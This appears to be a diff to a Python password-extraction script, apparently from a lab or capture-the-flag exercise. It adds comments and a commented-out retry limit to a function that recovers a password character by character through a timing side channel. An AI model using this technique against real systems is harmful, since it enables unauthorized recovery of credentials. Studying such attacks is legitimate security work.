@@ -32,17 +32,29 @@ def get_password(oracle_query, chars, log):
 
         log.log(f"Current password: '{current_password}'", 0)
 
+        # \/ this is essentially brute-force, see a better version down below (commented out)
+        # \/ as it assumes to have reached the final char, as soon as there is no clear winner char after
+        # a certain amount of time, there is no 100% guarantee that this will find the correct password (if the noise is high enough)
+        # so im going with the safer option
+
         # test if (current_password + char) is valid, then return
         # this step is necessary, as we always append another char '-' to the password to perform the timing attack
         probable_chars = test_chars((oracle_query, current_password, char) for char in chars)
         if any(probable_chars):
             return current_password + chr(max(probable_chars))
 
+        # ^
+        # ^
+
         certainty = 0
         most_common_char = ''
         # if there is no clear winner char (due to noise) we need to try again
         # I have set this threshold to 50% (arbitrary value that seems to work)
-        while certainty < 0.5:
+
+        # tries = 0
+        while certainty < 0.5:  # and tries < 10:
+
+            # tries += 1
 
             if len(most_common_char) > 0:
                 log.log(f"Certainty below 50%: trying again", 2)
@@ -54,6 +66,17 @@ def get_password(oracle_query, chars, log):
             log.log(f"""Proposed char(s): {probable_chars if config.verbosity > 1 else ''} ['{most_common_char}'] = {
                 (probable_chars.count(most_common_char) / len(probable_chars)) * 100}%""", 1)
             certainty = probable_chars.count(most_common_char) / len(probable_chars)
+
+        """if tries >= 10:
+            # assume we have reached the end of the password
+            # test if (current_password + char) is valid, then return
+            # this step is necessary, as we always append another char '-' to the password to perform the timing attack
+            probable_chars = test_chars((oracle_query, current_password, char) for char in chars)
+            if any(probable_chars):
+                return current_password + chr(max(probable_chars))
+            else:
+                break
+        """
 
         current_password += most_common_char
 
